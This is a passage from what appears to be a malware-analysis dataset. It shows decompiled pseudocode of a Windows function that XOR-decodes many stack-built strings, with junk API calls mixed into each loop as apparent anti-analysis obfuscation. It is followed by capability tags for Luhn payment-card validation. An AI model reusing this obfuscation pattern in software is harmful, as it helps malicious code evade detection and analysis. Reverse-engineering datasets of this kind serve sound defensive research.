iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar10 = 0;\n    var_24h = &var_14h - iVar9;\n    do {\n        iVar11 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar11 != 0xee795e) {\n            *(iVar10 + iVar9) = *(&var_2ch + iVar10 % var_38h) ^ (iVar10 + iVar9)[&var_14h - iVar9];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x13);\n    fcn.0040531e();\n    var_14h._0_1_ = 0x37;\n    var_14h._1_1_ = 8;\n    var_14h._2_1_ = 0x22;\n    var_14h._3_1_ = 0xb;\n    var_10h._0_1_ = 0x22;\n    var_10h._1_1_ = 0x10;\n    var_10h._2_1_ = 9;\n    var_10h._3_1_ = 0x1e;\n    var_ch._0_1_ = 0x14;\n    var_ch._1_1_ = 0x39;\n    var_ch._2_1_ = 0x34;\n    var_ch._3_1_ = 0x1f;\n    var_8h = 0x18;\n    var_7h = 0x15;\n    var_6h = 0x3e;\n    var_5h = 8;\n    var_4h._0_1_ = 8;\n    var_4h._1_1_ = 0x16;\n    var_4h._2_1_ = 6;\n    var_4h._3_1_ = 0x57;\n    var_b0h = 0x63716d64;\n    var_ach._0_1_ = 0x57;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_24h = &var_14h - iVar10;\n    do {\n        iVar12 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar12 != 0x785c7d) {\n            *(iVar11 + iVar10) = *(&var_b0h + iVar11 % var_34h) ^ (iVar11 + iVar10)[&var_14h - iVar10];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x14);\n    fcn.0040531e();\n    var_14h._0_1_ = 0;\n    var_14h._1_1_ = 0x1c;\n    var_14h._2_1_ = 6;\n    var_14h._3_1_ = 0x22;\n    var_10h._0_1_ = 0x33;\n    var_10h._1_1_ = 0x26;\n    var_10h._2_1_ = 0x1e;\n    var_10h._3_1_ = 0x12;\n    var_ch._0_1_ = 0x35;\n    var_ch._1_1_ = 0x38;\n    var_ch._2_1_ = 0x25;\n    var_ch._3_1_ = 0x10;\n    var_8h = 0x2e;\n    var_7h = 0x22;\n    var_6h = 0x36;\n    var_5h = 0x36;\n    var_4h._0_1_ = 0x79;\n    var_a8h = 0x47427953;\n    var_a4h._0_1_ = 0x51;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar12 = 0;\n    var_b0h = iVar11;\n    var_24h = &var_14h - iVar11;\n    do {\n        iVar13 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar13 != 0x4bc4bf) {\n            *(iVar12 + iVar11) = *(&var_a8h + iVar12 % var_34h) ^ (iVar12 + iVar11)[&var_14h - iVar11];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x11);\n    fcn.0040531e();\n    var_14h._0_1_ = 0x12;\n    var_14h._1_1_ = 0x35;\n    var_14h._2_1_ = 0x16;\n    var_14h._3_1_ = 0x1a;\n    var_10h._0_1_ = 0x17;\n    var_10h._1_1_ = 0x28;\n    var_10h._2_1_ = 0x24;\n    var_10h._3_1_ = 7;\n    var_ch._0_1_ = 0x1d;\n    var_ch._1_1_ = 0x1a;\n    var_ch._2_1_ = 0x37;\n    var_ch._3_1_ = 0x39;\n    var_8h = 0x3b;\n    var_7h = 10;\n    var_6h = 0x14;\n    var_5h = 0x24;\n    var_4h._0_1_ = 0x50;\n    var_a0h = 0x6f575041;\n    var_9ch._0_1_ = 0x73;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar12 = 0;\n    var_a8h = iVar11;\n    var_24h = &var_14h - iVar11;\n    do {\n        iVar13 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar13 != 0x1fb8ac) {\n            *(iVar12 + iVar11) = *(&var_a0h + iVar12 % var_34h) ^ (iVar12 + iVar11)[&var_14h - iVar11];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x11);\n    fcn.0040531e();\n    var_20h = 0x373a0067;\n    var_1ch._0_1_ = 10;\n    var_1ch._1_1_ = 0x40;\n    var_1ch._2_1_ = 0x51;\n    var_1ch._3_1_ = 8;\n    var_18h._0_1_ = 0x2c;\n    var_18h._1_1_ = 0x20;\n    var_18h._2_1_ = 0xf;\n    var_18h._3_1_ = 0x5d;\n    var_14h._0_1_ = 0x46;\n    var_14h._1_1_ = 10;\n    var_14h._2_1_ = 7;\n    var_14h._3_1_ = 0x23;\n    var_10h._0_1_ = 0x1c;\n    var_10h._1_1_ = 0x5a;\n    var_10h._2_1_ = 0x40;\n    var_10h._3_1_ = 0x35;\n    var_ch._0_1_ = 0x1b;\n    var_ch._1_1_ = 0x27;\n    var_ch._2_1_ = 0xf;\n    var_ch._3_1_ = 0x5d;\n    var_8h = 0x58;\n    var_7h = 0;\n    var_6h = 0xe;\n    var_5h = 0x2b;\n    var_4h._0_1_ = 0x79;\n    var_2ch = 0x4e696534;\n    var_28h._0_2_ = 0x3479;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1e);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar12 = 0;\n    var_a0h = iVar11;\n    var_24h = &var_20h - iVar11;\n    do {\n        iVar13 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar13 != 0xba2b14) {\n            *(iVar12 + iVar11) = *(&var_2ch + iVar12 % var_38h) ^ (iVar12 + iVar11)[&var_20h - iVar11];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x1d);\n    fcn.0040531e();\n    var_18h._0_1_ = 2;\n    var_18h._1_1_ = 0x54;\n    var_18h._2_1_ = 5;\n    var_18h._3_1_ = 0x38;\n    var_14h._0_1_ = 0x1b;\n    var_14h._1_1_ = 3;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 0x54;\n    var_10h._0_1_ = 8;\n    var_10h._1_1_ = 0x3f;\n    var_10h._2_1_ = 0xe;\n    var_10h._3_1_ = 4;\n    var_ch._0_1_ = 0x37;\n    var_ch._1_1_ = 0x48;\n    var_ch._2_1_ = 0x16;\n    var_ch._3_1_ = 0x22;\n    var_8h = 0x13;\n    var_7h = 0x1b;\n    var_6h = 0x38;\n    var_5h = 0x5d;\n    var_4h._0_1_ = 0x23;\n    var_4h._1_1_ = 0x37;\n    var_4h._2_1_ = 0x1f;\n    var_4h._3_1_ = 0x6d;\n    var_2ch = 0x50463151;\n    var_28h._0_2_ = 0x6d7a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar12 = 0;\n    var_24h = &var_18h - iVar11;\n    do {\n        iVar13 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar13 != 0xf041e) {\n            *(iVar12 + iVar11) = *(&var_2ch + iVar12 % var_38h) ^ (iVar12 + iVar11)[&var_18h - iVar11];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x18);\n    fcn.0040531e();\n    var_1ch._0_1_ = 0x61;\n    var_1ch._1_1_ = 0xf;\n    var_1ch._2_1_ = 0x24;\n    var_1ch._3_1_ = 0x35;\n    var_18h._0_1_ = 0x22;\n    var_18h._1_1_ = 0x5d;\n    var_18h._2_1_ = 0x1e;\n    var_18h._3_1_ = 0x13;\n    var_14h._0_1_ = 3;\n    var_14h._1_1_ = 0x27;\n    var_14h._2_1_ = 0x47;\n    var_14h._3_1_ = 0x1e;\n    var_10h._0_1_ = 0x12;\n    var_10h._1_1_ = 0x3f;\n    var_10h._2_1_ = 0x38;\n    var_10h._3_1_ = 0x5c;\n    var_ch._0_1_ = 0x3a;\n    var_ch._1_1_ = 4;\n    var_ch._2_1_ = 0x39;\n    var_ch._3_1_ = 0x39;\n    var_8h = 0x5b;\n    var_7h = 6;\n    var_6h = 0x13;\n    var_5h = 0x37;\n    var_4h._0_1_ = 0x2a;\n    var_4h._1_1_ = 0x32;\n    var_88h = 0x50766a32;\n    var_84h._0_1_ = 0x4f;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar13 = 0;\n    var_24h = &var_1ch - iVar12;\n    do {\n        iVar14 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar14 != 0x7d296e) {\n            *(iVar13 + iVar12) = *(&var_88h + iVar13 % var_34h) ^ (iVar13 + iVar12)[&var_1ch - iVar12];\n        }\n        iVar13 = iVar13 + 1;\n    } while (iVar13 < 0x1a);\n    fcn.0040531e();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_14h._0_1_ = 9;\n    var_14h._1_1_ = 0x34;\n    var_14h._2_1_ = 0x6c;\n    var_14h._3_1_ = 1;\n    var_10h._0_1_ = 0x14;\n    var_10h._1_1_ = 0x35;\n    var_10h._2_1_ = 0x32;\n    var_10h._3_1_ = 0x52;\n    var_ch._0_1_ = 0x3f;\n    var_ch._1_1_ = 2;\n    var_ch._2_1_ = 0x33;\n    var_ch._3_1_ = 0x27;\n    var_8h = 0x50;\n    var_7h = 3;\n    var_6h = 0x15;\n    var_5h = 0x3d;\n    var_4h._0_1_ = 0x34;\n    var_4h._1_1_ = 0x39;\n    var_80h = 0x6f39515a;\n    var_7ch._0_1_ = 0x70;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar14 = 0;\n    var_24h = &var_14h - iVar13;\n    var_88h = iVar13;\n    do {\n        iVar15 = (*pcVar1)();\n        if (iVar15 != 0x8a6259) {\n            *(iVar14 + iVar13) = *(&var_80h + iVar14 % var_34h) ^ (iVar14 + iVar13)[var_24h];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x12);\n    fcn.0040531e();\n    var_18h._0_1_ = 0x65;\n    var_18h._1_1_ = 0x12;\n    var_18h._2_1_ = 0x67;\n    var_18h._3_1_ = 0x4b;\n    var_14h._0_1_ = 0x5d;\n    var_14h._1_1_ = 0xd;\n    var_14h._2_1_ = 0x77;\n    var_14h._3_1_ = 0x10;\n    var_10h._0_1_ = 0x51;\n    var_10h._1_1_ = 0x5c;\n    var_10h._2_1_ = 0x47;\n    var_10h._3_1_ = 0x3e;\n    var_ch._0_1_ = 0x44;\n    var_ch._1_1_ = 0x1e;\n    var_ch._2_1_ = 0x42;\n    var_ch._3_1_ = 0x5b;\n    var_8h = 0x5f;\n    var_7h = 0xb;\n    var_6h = 0x51;\n    var_5h = 0x12;\n    var_4h._0_1_ = 0x34;\n    var_2ch = 0x32347736;\n    var_28h._0_2_ = 0x6e33;\n    uVar3 = (*pcVar1)(8, 0x16);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar14 = 0;\n    var_80h = iVar13;\n    var_24h = &var_18h - iVar13;\n    do {\n        iVar15 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar15 != 0xb99cd5) {\n            *(iVar14 + iVar13) = *(&var_2ch + iVar14 % var_38h) ^ (iVar14 + iVar13)[&var_18h - iVar13];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x15);\n    fcn.0040531e();\n    var_1ch._0_1_ = 0x18;\n    var_1ch._1_1_ = 0x15;\n    var_1ch._2_1_ = 0x13;\n    var_1ch._3_1_ = 0x36;\n    var_18h._0_1_ = 0x36;\n    var_18h._1_1_ = 0x29;\n    var_18h._2_1_ = 0x1c;\n    var_18h._3_1_ = 0x33;\n    var_14h._0_1_ = 0x1c;\n    var_14h._1_1_ = 0x32;\n    var_14h._2_1_ = 0x27;\n    var_14h._3_1_ = 0x15;\n    var_10h._0_1_ = 0x31;\n    var_10h._1_1_ = 0x39;\n    var_10h._2_1_ = 0x23;\n    var_10h._3_1_ = 0x22;\n    var_ch._0_1_ = 0x1f;\n    var_ch._1_1_ = 0x38;\n    var_ch._2_1_ = 8;\n    var_ch._3_1_ = 0x25;\n    var_8h = 0x22;\n    var_7h = 6;\n    var_6h = 0x3f;\n    var_5h = 0x34;\n    var_4h._0_1_ = 0x32;\n    var_4h._1_1_ = 0x2c;\n    var_4h._2_1_ = 0x15;\n    var_4h._3_1_ = 0x56;\n    var_70h = 0x5856704b;\n    var_6ch._0_1_ = 0x57;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar14 = 0;\n    var_24h = &var_1ch - iVar13;\n    do {\n        iVar15 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar15 != 0x5b9aad) {\n            *(iVar14 + iVar13) = *(&var_70h + iVar14 % var_34h) ^ (iVar14 + iVar13)[&var_1ch - iVar13];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x1c);\n    fcn.0040531e();\n    var_18h._0_1_ = 0x15;\n    var_18h._1_1_ = 0x32;\n    var_18h._2_1_ = 0x22;\n    var_18h._3_1_ = 0x57;\n    var_14h._0_1_ = 0x16;\n    var_14h._1_1_ = 0x27;\n    var_14h._2_1_ = 0x30;\n    var_14h._3_1_ = 10;\n    var_10h._0_1_ = 0x60;\n    var_10h._1_1_ = 0x17;\n    var_10h._2_1_ = 0x2a;\n    var_10h._3_1_ = 0x22;\n    var_ch._0_1_ = 2;\n    var_ch._1_1_ = 0x53;\n    var_ch._2_1_ = 0x28;\n    var_ch._3_1_ = 0x34;\n    var_8h = 0x3e;\n    var_7h = 0x19;\n    var_6h = 0x5f;\n    var_5h = 0x14;\n    var_4h._0_1_ = 0x23;\n    var_4h._1_1_ = 0x30;\n    var_4h._2_1_ = 10;\n    var_4h._3_1_ = 0x36;\n    var_68h = 0x366f5746;\n    var_64h._0_1_ = 0x78;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar15 = 0;\n    var_70h = iVar14;\n    var_24h = &var_18h - iVar14;\n    do {\n        iVar16 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar16 != 0x480a28) {\n            *(iVar15 + iVar14) = *(&var_68h + iVar15 % var_34h) ^ (iVar15 + iVar14)[&var_18h - iVar14];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x18);\n    fcn.0040531e();\n    var_18h._0_1_ = 4;\n    var_18h._1_1_ = 0x57;\n    var_18h._2_1_ = 0x18;\n    var_18h._3_1_ = 0x1b;\n    var_14h._0_1_ = 0x49;\n    var_14h._1_1_ = 0x2a;\n    var_14h._2_1_ = 0x25;\n    var_14h._3_1_ = 0x41;\n    var_10h._0_1_ = 0x3e;\n    var_10h._1_1_ = 0x18;\n    var_10h._2_1_ = 0x58;\n    var_10h._3_1_ = 0x3b;\n    var_ch._0_1_ = 0x32;\n    var_ch._1_1_ = 0x62;\n    var_ch._2_1_ = 0x23;\n    var_ch._3_1_ = 0x1f;\n    var_8h = 0x4f;\n    var_7h = 0x26;\n    var_6h = 0x3b;\n    var_5h = 0x57;\n    var_4h._0_1_ = 0x36;\n    var_4h._1_1_ = 0x13;\n    var_4h._2_1_ = 0x39;\n    var_2ch = 0x76513257;\n    var_28h._0_2_ = 0x4f39;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar15 = 0;\n    var_68h = iVar14;\n    var_24h = &var_18h - iVar14;\n    do {\n        iVar16 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar16 != 0xb5ca83) {\n            *(iVar15 + iVar14) = *(&var_2ch + iVar15 % var_38h) ^ (iVar15 + iVar14)[&var_18h - iVar14];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x17);\n    fcn.0040531e();\n    var_18h._0_1_ = 9;\n    var_18h._1_1_ = 0x52;\n    var_18h._2_1_ = 0x25;\n    var_18h._3_1_ = 0x1d;\n    var_14h._0_1_ = 0x16;\n    var_14h._1_1_ = 0x3b;\n    var_14h._2_1_ = 0x43;\n    var_14h._3_1_ = 3;\n    var_10h._0_1_ = 0x28;\n    var_10h._1_1_ = 0x1f;\n    var_10h._2_1_ = 0x35;\n    var_10h._3_1_ = 0x55;\n    var_ch._0_1_ = 7;\n    var_ch._1_1_ = 3;\n    var_ch._2_1_ = 0x23;\n    var_ch._3_1_ = 0x28;\n    var_8h = 0x5e;\n    var_7h = 0x10;\n    var_6h = 6;\n    var_5h = 0x1f;\n    var_4h._0_1_ = 0x3f;\n    var_4h._1_1_ = 0x50;\n    var_4h._2_1_ = 3;\n    var_4h._3_1_ = 0x6f;\n    var_58h = 0x6f66375a;\n    var_54h._0_1_ = 0x73;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar15 = 0;\n    var_24h = &var_18h - iVar14;\n    do {\n        iVar16 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar16 != 0x53c735) {\n            *(iVar15 + iVar14) = *(&var_58h + iVar15 % var_34h) ^ (iVar15 + iVar14)[&var_18h - iVar14];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x18);\n    fcn.0040531e();\n    var_20h = 0x38073c1f;\n    var_1ch._0_1_ = 0x40;\n    var_1ch._1_1_ = 0x3f;\n    var_1ch._2_1_ = 0x2d;\n    var_1ch._3_1_ = 0x36;\n    var_18h._0_1_ = 0x2e;\n    var_18h._1_1_ = 0x76;\n    var_18h._2_1_ = 0x3e;\n    var_18h._3_1_ = 0x3c;\n    var_14h._0_1_ = 0x37;\n    var_14h._1_1_ = 7;\n    var_14h._2_1_ = 0x54;\n    var_14h._3_1_ = 0x22;\n    var_10h._0_1_ = 0x18;\n    var_10h._1_1_ = 0x30;\n    var_10h._2_1_ = 0x29;\n    var_10h._3_1_ = 0x50;\n    var_ch._0_1_ = 0x3f;\n    var_ch._1_1_ = 0x2a;\n    var_ch._2_1_ = 3;\n    var_ch._3_1_ = 0x38;\n    var_8h = 0x5c;\n    var_7h = 0x3a;\n    var_6h = 0x30;\n    var_5h = 0x3f;\n    var_4h._0_1_ = 0x2f;\n    var_4h._1_1_ = 0x52;\n    var_4h._2_1_ = 0x29;\n    var_4h._3_1_ = 0x59;\n    var_50h = 0x4a53594c;\n    var_4ch._0_1_ = 0x35;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar16 = 0;\n    var_58h = iVar15;\n    var_24h = &var_20h - iVar15;\n    do {\n        iVar17 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar17 != 0x18e6e1) {\n            *(iVar16 + iVar15) = *(&var_50h + iVar16 % var_34h) ^ (iVar16 + iVar15)[&var_20h - iVar15];\n        }\n        iVar16 = iVar16 + 1;\n    } while (iVar16 < 0x20);\n    fcn.0040531e();\n    var_14h._0_1_ = 0x15;\n    var_14h._1_1_ = 0xd;\n    var_14h._2_1_ = 0x23;\n    var_14h._3_1_ = 0x51;\n    var_10h._0_1_ = 0x54;\n    var_10h._1_1_ = 0x27;\n    var_10h._2_1_ = 10;\n    var_10h._3_1_ = 0x14;\n    var_ch._0_1_ = 0x58;\n    var_ch._1_1_ = 0x68;\n    var_ch._2_1_ = 0x34;\n    var_ch._3_1_ = 1;\n    var_8h = 7;\n    var_7h = 0x5d;\n    var_6h = 0x54;\n    var_5h = 0x23;\n    var_4h._0_1_ = 0xf;\n    var_4h._1_1_ = 0x14;\n    var_4h._2_1_ = 0x34;\n    var_48h = 0x34716846;\n    var_44h._0_1_ = 0x38;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar16 = 0;\n    var_50h = iVar15;\n    var_24h = &var_14h - iVar15;\n    do {\n        iVar17 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar17 != 0x4bc25b) {\n            *(iVar16 + iVar15) = *(&var_48h + iVar16 % var_34h) ^ (iVar16 + iVar15)[&var_14h - iVar15];\n        }\n        iVar16 = iVar16 + 1;\n    } while (iVar16 < 0x13);\n    fcn.0040531e();\n    var_20h = 0x6115223;\n    var_1ch._0_1_ = 0x39;\n    var_1ch._1_1_ = 2;\n    var_1ch._2_1_ = 0x52;\n    var_1ch._3_1_ = 0x39;\n    var_18h._0_1_ = 0x1b;\n    var_18h._1_1_ = 0x3f;\n    var_18h._2_1_ = 0x27;\n    var_18h._3_1_ = 0x58;\n    var_14h._0_1_ = 0x2a;\n    var_14h._1_1_ = 3;\n    var_14h._2_1_ = 0x33;\n    var_14h._3_1_ = 0x1e;\n    var_10h._0_1_ = 0x50;\n    var_10h._1_1_ = 0xb;\n    var_10h._2_1_ = 0xd;\n    var_10h._3_1_ = 0x2e;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 0x45;\n    var_ch._2_1_ = 0x31;\n    var_ch._3_1_ = 0x1e;\n    var_8h = 0x33;\n    var_7h = 0x1c;\n    var_6h = 0x52;\n    var_5h = 0x3f;\n    var_4h._0_1_ = 0xd;\n    var_4h._1_1_ = 0x5a;\n    var_40h = 0x68583770;\n    var_3ch._0_1_ = 0x5a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar16 = 0;\n    var_48h = iVar15;\n    var_24h = &var_20h - iVar15;\n    do {\n        iVar17 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar17 != 0x629562) {\n            *(iVar16 + iVar15) = *(&var_40h + iVar16 % var_34h) ^ (iVar16 + iVar15)[&var_20h - iVar15];\n        }\n        iVar16 = iVar16 + 1;\n    } while (iVar16 < 0x1e);\n    fcn.0040531e();\n    var_14h._0_1_ = 0x2b;\n    var_14h._1_1_ = 0x1c;\n    var_14h._2_1_ = 0x1b;\n    var_14h._3_1_ = 0x11;\n    var_10h._0_1_ = 0x39;\n    var_10h._1_1_ = 0x1d;\n    var_10h._2_1_ = 0x23;\n    var_10h._3_1_ = 0x20;\n    var_ch._0_1_ = 0x16;\n    var_ch._1_1_ = 0x31;\n    var_ch._2_1_ = 0x28;\n    var_ch._3_1_ = 0xb;\n    var_8h = 0x26;\n    var_7h = 0xe;\n    var_6h = 0x3d;\n    var_5h = 0x14;\n    var_4h._0_1_ = 0x1c;\n    var_4h._1_1_ = 0x28;\n    var_4h._2_1_ = 0x1d;\n    var_4h._3_1_ = 0x54;\n    var_2ch = 0x784f7978;\n    var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x54);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar16 = 0;\n    var_40h = iVar15;\n    var_24h = &var_14h - iVar15;\n    do {\n        iVar17 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar17 != 0x25a364) {\n            *(iVar16 + iVar15) = *(&var_2ch + iVar16 % var_34h) ^ (iVar16 + iVar15)[&var_14h - iVar15];\n        }\n        iVar16 = iVar16 + 1;\n    } while (iVar16 < 0x14);\n    fcn.0040531e();\n    var_20h = 0x42742361;\n    var_1ch._0_1_ = 0x55;\n    var_1ch._1_1_ = 0x30;\n    var_1ch._2_1_ = 0x46;\n    var_1ch._3_1_ = 0x23;\n    var_18h._0_1_ = 100;\n    var_18h._1_1_ = 0x49;\n    var_18h._2_1_ = 0x5d;\n    var_18h._3_1_ = 0x33;\n    var_14h._0_1_ = 0x5d;\n    var_14h._1_1_ = 0x2a;\n    var_14h._2_1_ = 0x5e;\n    var_14h._3_1_ = 0x53;\n    var_10h._0_1_ = 0x7c;\n    var_10h._1_1_ = 0x38;\n    var_10h._2_1_ = 0x5c;\n    var_10h._3_1_ = 0x2d;\n    var_ch._0_1_ = 0x67;\n    var_ch._1_1_ = 0x42;\n    var_ch._2_1_ = 0x59;\n    var_ch._3_1_ = 0x27;\n    var_8h = 0x5b;\n    var_7h = 0x2a;\n    var_6h = 0x52;\n    var_5h = 0x57;\n    var_4h._0_1_ = 0x55;\n    var_4h._1_1_ = 0x51;\n    var_2ch = 0x30374632;\n    var_28h._0_2_ = 0x5130;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar16 = 0;\n    var_24h = &var_20h - iVar15;\n    do {\n        iVar17 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar17 != 0xf7c193) {\n            *(iVar16 + iVar15) = *(&var_2ch + iVar16 % var_38h) ^ (iVar16 + iVar15)[&var_20h - iVar15];\n        }\n        iVar16 = iVar16 + 1;\n    } while (iVar16 < 0x1e);\n    fcn.0040531e();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar15);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, var_40h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_48h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_50h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_58h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar14);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_68h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_70h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar13);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_80h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_88h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar12);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar11);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_a0h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_a8h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_b0h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar10);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar9);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar8);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_c0h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_c8h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_d0h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_d8h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_e0h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_e8h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_60h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar6);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_78h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_98h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_b8h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar18);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar4);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 21042
    },
    "00409867": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
